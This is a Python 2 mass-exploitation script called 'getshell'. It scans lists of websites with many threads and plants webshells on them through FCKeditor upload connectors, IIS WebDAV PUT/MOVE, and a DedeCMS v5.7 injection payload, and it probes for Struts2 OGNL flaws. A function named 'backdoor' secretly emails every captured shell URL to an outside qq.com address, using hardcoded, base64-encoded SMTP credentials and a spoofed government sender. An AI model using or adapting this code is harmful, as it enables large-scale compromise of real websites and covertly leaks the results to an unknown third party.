# -*- coding: utf-8 -*-
'''
                   _ooOoo_
                  o8888888o
                  88" . "88
                  (| -_- |)
                  O\  =  /O
               ____/`---'\____
             .'  \\|     |//  `.
            /  \\|||  :  |||//  \
           /  _||||| -:- |||||-  \
           |   | \\\  -  /// |   |
           | \_|  ''\---/''  |   |
           \  .-\__  `-`  ___/-. /
         ___`. .'  /--.--\  `. . __
      ."" '<  `.___\_<|>_/___.'  >'"".
     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
     \  \ `-.   \_ __\ /__ _/   .-` /  /
======`-.____`-.___\_____/___.-`____.-'======
                   `=---='
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

         		Author:xiyang
           		thanks:bstaint
'''

import os,sys,getopt,requests,re,time,Queue,threading,smtplib,base64,ctypes,urllib2,httplib
from datetime import datetime

 
STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE= -11
STD_ERROR_HANDLE = -12
 
FOREGROUND_BLACK = 0x0
FOREGROUND_BLUE = 0x01 # text color contains blue.
FOREGROUND_GREEN= 0x02 # text color contains green.
FOREGROUND_RED = 0x04 # text color contains red.
FOREGROUND_INTENSITY = 0x08 # text color is intensified.
 
BACKGROUND_BLUE = 0x10 # background color contains blue.
BACKGROUND_GREEN= 0x20 # background color contains green.
BACKGROUND_RED = 0x40 # background color contains red.
BACKGROUND_INTENSITY = 0x80 # background color is intensified.
 
class Color:

    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
     
    def set_cmd_color(self, color, handle=std_out_handle):
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
        return bool
     
    def reset_color(self):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
     
    def print_red_text(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()
         
     
    def print_blue_text(self, print_text):
        self.set_cmd_color(FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()

clr=Color()   


def killrepeat(txtfilename):
    try:
        filename=os.getcwd()+'\\'+txtfilename
        array='\n'.join(set(open(filename).read().split('\n')))
        sk=open(os.getcwd()+'\\1.txt','w')
        sk.write(array)
        sk.close()
        os.remove(txtfilename)
        os.rename('1.txt',txtfilename)
        print 'kill repeat success - -'
        print array
    except Exception,e:
        print '\nkillrepeat fail\n'

    sk=open(filename,'r+')
    sk.seek(0)
    point=open(os.getcwd()+'\\survival.txt','a')

    threadlist=[]
    queue=Queue.Queue()

    for url in sk:
        queue.put(url)
    for i in range(0,thnum):
        h=threading.Thread(target=survival,args=(point,queue,))
        threadlist.append(h)
    for i in threadlist:
        i.start()
    for i in threadlist:
        i.join()



    print '\n\n\n\nrepeat and not survival total kill \n\n'
    print 'because thread stop need second,so program sleep 5s\n\n'
    time.sleep(5)
    point.close()
    sk.close()



def survival(point,queue):
    while not queue.empty():
        try:
            href=queue.get(block=False)
            href=href.replace('\n','')
            x=requests.get(url=href,timeout=5)
            if x.status_code==200:
                point.write(href+'\n')
        except Queue.Empty:
            break
        except:
            print 'overtime url:'+href
            continue

def filter(temp,save):
    if temp.find('(1)')!=-1:
        xtemp=temp.replace('(1)','')
        if xtemp.find('../')==-1:
            xtemp=xtemp.replace('../','')
        createfloder=requests.get(xtemp)
        if createfloder.status_code!=404 and createfloder.text.find('for my best girl')!=-1:
            print ''+xtemp
            save.write(xtemp+'\n')
            return 'true'
        return 'false'
    return 'false'


def fckgetshell(save,queue):
    global ecx
    notreplace=['upload/aspx/upload.aspx?Type=Media','connectors/asp/upload.asp?type=Media','upload/php/upload.php?Type=Media','connectors/php/upload.php?type=Media']
    fckfinger=['/admin/fckeditor/editor/filemanager/','/editor/editor/editor/filemanager/','/fckeditor/editor/filemanager/','/manage/fckeditor/editor/filemanager/']
    listfolder=['connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F','connectors/asp/connector.asp?Command=GetFolders&Type=File&CurrentFolder=%2F','/browser/default/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/zy.asp&NewFolderName=ssss']
    createfloderarr=['/connectors/aspx/connector.aspx?Command=CreateFolder&Type=File&CurrentFolder=%2Fzy.asp&NewFolderName=erji.asp','/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2Fzy.asp&NewFolderName=x']
            
    while 1:

        try:
            www=queue.get(block=False)
            print str(ecx)+' scaning '+www
            ecx=ecx+1
            h=1

            for x in range(4):

                www=www.replace('http://','')
                httpClient = httplib.HTTPConnection(www, 80, timeout=10)
                httpClient.request('GET', fckfinger[x])
                response = httpClient.getresponse()
                #print response.getheaders()
                if h==1:
                    if str(response.getheaders()).find('IIS')==-1 :
                        h=5
                        break
                    h=0
                
                if response.status!=404:
                    break


            if h==5:
                continue
            if response.status!=403:
                continue
            www='http://'+www
            line=www+fckfinger[x]
            clr.print_blue_text('exist fck dir '+line)

            for i in range(3):
                ccc=requests.get(line+listfolder[i])
                try:

                    if ccc.status_code==200:
                        soup=requests.get(line+listfolder[i]).text
                        shelladdr=re.findall(r'url="(.+?)\"',soup)[0]
                        if shelladdr.find('zy.asp')==-1:
                            soup=requests.get(line+listfolder[i].replace('zy.asp','zy.a.assp')).text
                            shelladdr=re.findall(r'url="(.+?)\"',soup)[0]

                        break
                except:
                    i=2
                    ccc.status_code=404
                    break
            #防止有些站存在漏洞文件却无权限的问题，所以直接调用无过滤上传接口


            #当fck版本2.3的时候  需要再加一个函数...what the fuck!!!
            #0402晚上十一点改..好吧  改都改了。。。 那个aspx_upload函数参数写line+browser/default 是因为i==2，so. fck版本2.3
            if i==2:

                if ccc.status_code!=200:
                    for t in range(3):
                        notre=requests.get(line+notreplace[t])
                        if notre.status_code!=404:
                            break
                    if notre.status_code!=404:
                        urlparam=line+notreplace[t]
                        responseaddr=gotoshell(urlparam)
                        if responseaddr.find('.asp')==-1:
                            continue
                        if responseaddr[0]=='h':
                            test=requests.get(responseaddr)
                        else:
                            test=requests.get(www+'/'+responseaddr)
                        if test.status_code==200 and test.text.find('for my best girl')!=-1:
                            #print ''+test.url
                            clr.print_red_text(test.url)
                            save.write(test.url+'\n')
                            #2015.05.19加的判断条件 and test.txt.find('')
                    continue

                #写完后我发现下面这段if else代码块我copy了两次...其实可以封装成一个函数
                #不过这又得牵扯到一些参数问题，改的话很麻烦
                #而且封装成函数不见得执行效率会变高，只是修改此段代码的时候方便而已
                #然而我并不打算再对这段代码动刀了
                mumaname=aspx_upload(line+'/browser/default/')
                if mumaname=='error':
                	continue
                temp=www+'/'+shelladdr+mumaname

                jugde=filter(temp,save)
                if jugde=='true':
                    continue


                createfloder=requests.get(temp)
                if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                    #print ''+temp
                    clr.print_red_text(temp)
                    save.write(temp+'\n')
                else:
                    temp=www+'//'+mumaname

                    createfloder=requests.get(temp)
                    if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                        #print ''+www+mumaname
                        clr.print_red_text(www+mumaname)
                        save.write(www+mumaname+'\n')
                    else:
                        jugde=filter(temp,save)

                continue

            if i==0:
                createfloder=requests.get(line+createfloderarr[i])
                mumaname=aspx_upload(line)
                if mumaname=='error':
                	continue
                temp=www+shelladdr+'zy.asp/'+mumaname

                createfloder=requests.get(temp)
                if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                    #print ''+temp
                    clr.print_red_text(temp)
                    save.write(temp+'\n')
                else:
                    temp=www+'//'+mumaname

                    createfloder=requests.get(temp)
                    if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                        #print ''+www+mumaname
                        clr.print_red_text(www+mumaname)
                        save.write(www+mumaname+'\n')
                    else:
                        jugde=filter(temp,save)

                continue

            else :
                    createfloder=requests.get(line+createfloderarr[1])
                    mumaname=aspx_upload(line)
                    if mumaname=='error':
                    	continue
                    temp=www+shelladdr+'zy.asp'+mumaname

                    createfloder=requests.get(temp)
                    if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                        #print ''+www+shelladdr+'zy.asp/'+mumaname
                        clr.print_red_text(www+shelladdr+'zy.asp/'+mumaname)
                        save.write(www+shelladdr+'zy.asp/'+mumaname+'\n')
                    else:
                        temp=www+'//'+mumaname

                        createfloder=requests.get(temp)
                        if createfloder.status_code==200 and createfloder.text.find('for my best girl')!=-1:
                            #print ''+www+mumaname
                            clr.print_red_text(www+mumaname)
                            save.write(www+mumaname+'\n')
                        else:
                            jugde=filter(temp,save)

                    continue

            continue

        except Queue.Empty:
            break
        except:
            continue


# this func iisputgetshell coder by lijiejie
# thanks
def iisputgetshell(save,queue): 
    global ecx
    while 1:

        try:
            if not queue.empty():
                urlvalue=queue.get().replace('http://','')
                print str(ecx)+'[*]scaning\t '+urlvalue
                ecx=ecx+1

                conn = httplib.HTTPConnection(urlvalue)
                conn.request(method='OPTIONS', url='/')
                headers = dict(conn.getresponse().getheaders())
                if headers.get('server', '').find('Microsoft-IIS') < 0:
                    #print 'This is not an IIS web server'
                    continue

                if 'public' in headers and \
                   headers['public'].find('PUT') > 0 and \
                   headers['public'].find('MOVE') > 0:
                    conn.close()
                    conn = httplib.HTTPConnection(urlvalue)
                    # PUT hack.txt
                    conn.request( method='PUT', url='/hack.txt', body='<%execute(request("xiwang"))%>' )
                    conn.close()
                    conn = httplib.HTTPConnection(urlvalue)
                    # mv hack.txt to hack.asp
                    conn.request(method='MOVE', url='/hack.txt', headers={'Destination': '/hack.asp'})
                    iisshellprobe=urllib2.urlopen('http://' + urlvalue + '/hack.asp')
                    if iisshellprobe.code==200:
                        clr.print_blue_text('ASP webshell:', 'http://' + urlvalue + '/hack.asp')
                        save.write('http://' + urlvalue + '/hack.asp')
            else:
                break
        except Exception,e:
            continue
        except Queue.Empty:
            break





def gotoshell(url):

    mumaaddr=os.getcwd()+'\\muma\\asp.txt'
    now=time.strftime('%Y%m%d%H%M%S')
    muma={
        'NewFile':(now+'.asp',open(mumaaddr,'rb'))
    }
    request=requests.post(url,files=muma)
    try:
        return re.findall(r'\,\'(.+?)\'\,',request.text)[0]
    except:
        return re.findall(r'\,\"(.+?)\"\,',request.text)[0]

def aspx_upload(www):

    aurl='/connectors/asp//connector.asp?Command=FileUpload&Type=File&CurrentFolder=/zy.asp/'
    burl='/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=/zy.asp/'

    shellname=time.strftime('%Y%m%d%H%M%S')+'.jpg'

    mumaaddr=os.getcwd()+'\\muma\\asp.txt'
    muma={
        'NewFile':(shellname,open(mumaaddr,'rb'))
    }

    
    request=requests.post(www+aurl,files=muma)
    request=requests.post(www+aurl,files=muma)

    if request.status_code==404 or request.status_code==500:
        request=requests.post(www+burl,files=muma)

    testerror=request.text.find('jpg')
    if testerror==-1:
        request=requests.post(www+burl,files=muma)
        request=requests.post(www+burl,files=muma)
        testerror=request.text.find('jpg')
        if testerror==-1:
        	return 'error'

    text=request.text.replace('\\\\','')
    try:
        return (re.findall(r'\(\d*?,\'(.*?)\'',text)[0])
    except:
        try:
            return (re.findall(r'\(\d*?,\"(.*?)\"',text)[0])
        except:
#            return shellname
			return 'error'

def abstract(filex):
#我真是日了狗了,04.02凌晨十二点半添加该函数
    try:
        filename=os.getcwd()+'\\'+filex
        p=open(filename)
        s=open(os.getcwd()+'\\'+'abstract_url.txt','w')
        for i in p:
            try:
                postfix=re.findall(r'http:\/\/(.+?)\/',i)[0]
                s.write('http://'+postfix+'\n')
            except:
                continue
    except:
        print 'abstract func fail'
    finally:
        p.close()
        s.close()

def threadfunc(filex,sign):

    threadlist=[]
    queue=Queue.Queue()
    threads=thnum
    fckgetshelltxtname=os.getcwd()+'\\'+filex
    save=open(os.getcwd()+'\\shell.txt','w')


    for i in open(fckgetshelltxtname):
        queue.put(i.replace('\n',''))
    for h in range(0,threads):
        if sign=='fck':
            h=threading.Thread(target=fckgetshell,args=(save,queue,))
        else:
            if sign=='struts2':
                h=threading.Thread(target=struts,args=(save,queue,))
            if sign=='dede':
                h=threading.Thread(target=dedegetshell,args=(save,queue,))
            if sign=='iisput':
            	h=threading.Thread(target=iisputgetshell,args=(save,queue,))

        threadlist.append(h)
    for i in threadlist:
        i.start()
    for i in threadlist:
        i.join()


    #time.sleep(5)


    print '\n\n'+sign+'getshell ------- game over'
    print '\nthread ready over\n'
    print 'because thread stop need second,so program sleep 5s\n'
    print 'of course,it sleep 5s,maybe print some not write the url shell..'
    while not queue.empty():
    	print queue.get()
    queue.queue.clear()

    save.close()

    bd=open(os.getcwd()+'\\shell.txt').read()

    backdoor(bd)


    #因为多余的线程早早的queue.get()了 ， 所以即使结束程序即使清空队列也会执行完毕
    #因为ctrl+c后没必要再回显，所以我直接干掉解释器进程了...也不知道这么做好不好

def struts(save,queue):
    while not queue.empty():
        try:
            url=queue.get().replace('\n','')
            print 'scaning '+url
            poc=[
                "?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(5000)')(d))",
                "?id='%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'",
                "?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&z[%28foo%29%28%27meh%27%29]=true",
                "?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(false)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&x[(class.classLoader.jarPath)('aa')]",
                "?a=1${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(3000)}"
            ]
            for i in poc:
                a = time.strftime('%H:%M:%S')
                request=requests.get(url=url,timeout=10)
                b = time.strftime('%H:%M:%S')
                time_a = datetime.strptime(a,'%H:%M:%S')
                time_b = datetime.strptime(b,'%H:%M:%S')
                normaltime=(time_b-time_a).seconds

                a = time.strftime('%H:%M:%S')
                request=requests.get(url=url+i,timeout=10)
                b = time.strftime('%H:%M:%S')
                time_a = datetime.strptime(a,'%H:%M:%S')
                time_b = datetime.strptime(b,'%H:%M:%S')
                testpoctime=(time_b-time_a).seconds

                sumtime=testpoctime-normaltime
                if sumtime>=5 and sumtime<=10:
                    clr.print_blue_text(url)
                    save.write(url+'\n')


        except Exception,e:
            #print e
            clr.print_red_text('struts getshell function execution error')
            continue
        except Queue.Empty():
            break

def dedegetshell(save,queue):
	
    t='/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=51&arrs2[]=49&arrs2[]=49&arrs2[]=55&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=120&arrs2[]=105&arrs2[]=119&arrs2[]=97&arrs2[]=110&arrs2[]=103&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=36&arrs2[]=97&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=115&arrs2[]=116&arrs2[]=114&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=120&arrs2[]=44&arrs2[]=34&arrs2[]=34&arrs2[]=44&arrs2[]=34&arrs2[]=97&arrs2[]=120&arrs2[]=115&arrs2[]=120&arrs2[]=120&arrs2[]=115&arrs2[]=120&arrs2[]=101&arrs2[]=120&arrs2[]=114&arrs2[]=120&arrs2[]=120&arrs2[]=116&arrs2[]=34&arrs2[]=41&arrs2[]=59&arrs2[]=36&arrs2[]=97&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=34&arrs2[]=120&arrs2[]=105&arrs2[]=119&arrs2[]=97&arrs2[]=110&arrs2[]=103&arrs2[]=34&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=32&arrs2[]=63&arrs2[]=62&arrs2[]=102&arrs2[]=111&arrs2[]=114&arrs2[]=32&arrs2[]=109&arrs2[]=121&arrs2[]=32&arrs2[]=98&arrs2[]=101&arrs2[]=115&arrs2[]=116&arrs2[]=32&arrs2[]=103&arrs2[]=105&arrs2[]=114&arrs2[]=108&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96'

    while not queue.empty():
        try:
            www=queue.get().replace('\n','')
            print 'exploit struder '+www+'\n'
            req=urllib2.urlopen(www+t)
            if req.code!=200:continue
            req=urllib2.urlopen(www+'/plus/mytag_js.php?aid=3117')
            req=urllib2.urlopen(www+'/plus/xiyang.php')
            if req.code==200 and req.read().find('for my best girl')!=-1:
                save.write(www+'/plus/xiyang.php'+'\n')
                clr.print_blue_text(www+'/plus/xiyang.php')
            '''
            else:
            	payload='$a=${@file_put_contents("xiyang.php","<?php echo "for my best girl";$a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["xiwang"]); ?>")};'
            	req=urllib2.urlopen(url=www+'/plus/car.php',data=payload,timeout=10)
            	if req.status_code==200:
            		save.write(www+'/plus/xiyang.php'+'\n')
            		clr.print_blue_text(www+'/plus/xiyang.php'+'\n')
			'''
        except Queue.Empty:
            break
        except:

            clr.print_red_text(www+' dede getshell error'+'\n')
            continue

        

def backdoor(bd):
	try:
	    user='qiangshenhu@yeah.net'
	    password='YTE1MzE1OQ==\n'
	    sm=smtplib.SMTP('smtp.yeah.net')
	    sm.login(user,base64.decodestring(password))
	    message = """From: 110 <110@gov.cn>
	    To: Come on <to@todomain.com>
	    Subject: one wave shell to your email


	    """ 
	    #email header
	    message=message+bd
	    sm.sendmail(user,'97686845@qq.com',message)
	    sm.close()
	    print '\nsome func execute success...'
	except:
		print '\nmaybe some code have error...'


def main():
    killrepeattxtname='x'
    fckgetshelltxtname='g'
    absname='a'
    threadnum=50
    strutsname='s'
    dedename='d'
    iisput='i'
    a = time.strftime('%H:%M:%S')
    #a 计时


    options,args=getopt.getopt(sys.argv[1:],'k:f:a:t:s:d:i:')

    for name,value in options:
        if name=='-k':
            killrepeattxtname=value
        if name=='-f':
            fckgetshelltxtname=value
        if name=='-a':
            absname=value
        if name=='-t':
            threadnum=value
        if name=='-s':
            strutsname=value
        if name=='-d':
        	dedename=value
    	if name=='-i':
    		iisput=value


    threadnum=int(threadnum)
    global thnum #全局变量，控制线程数
    global ecx
    ecx=0

    thnum=threadnum
    if threadnum!=50:
        thnum=threadnum



    print '******************************************************'
    print '*	         software name   :getshell	     *'
    print '*                author          :xiyang             *'
    print '*	         date            :2015.03.25.214018  *'
    print '*	          ps             :for my best girl   *'
    print '******************************************************'

    if killrepeattxtname=='x' and \
       fckgetshelltxtname=='g' and \
       absname=='a' and \
       threadnum==50 and \
       strutsname=='s' and \
       dedename=='d' and \
       iisput=='i':
        print '\n\nbig brothers. u write param le ?\n\n'
    else:
        if fckgetshelltxtname!='g':
            sign='fck'
            print '\n\nprogram start!'
            print 'current thread number is :'
            print thnum
            print 'good luck\n'
            threadfunc(fckgetshelltxtname,sign)

        if strutsname!='s':
            sign='struts2'
            print '\n\nstruts2 exploit wait start\n'
            print 'current thread number is :'+str(thnum)
            print 'good luck\n'
            threadfunc(strutsname,sign)
        if killrepeattxtname!='x':
            killrepeat(killrepeattxtname)

        if absname!='a':
            abstract(absname)
        if dedename!='d':
            sign='dede'
            print '\n\ndede v5.7 exploit wait start\n'
            print 'current thread number is :'+str(thnum)
            print 'good luck\n'
            threadfunc(dedename,sign)
        if iisput!='i':
        	sign='iisput'
        	print '\n\niis put getshell start\n'
        	print 'current thread number is :'+str(thnum)
        	print 'good luck\n'
        	threadfunc(iisput,sign)


    b = time.strftime('%H:%M:%S')
    time_a = datetime.strptime(a,'%H:%M:%S')
    time_b = datetime.strptime(b,'%H:%M:%S')
    print '\nthreadfunc exec :'+str((time_b - time_a).seconds)+'s'            


    os.system('taskkill /f /im pypy.exe')


if __name__=='__main__':
    main()
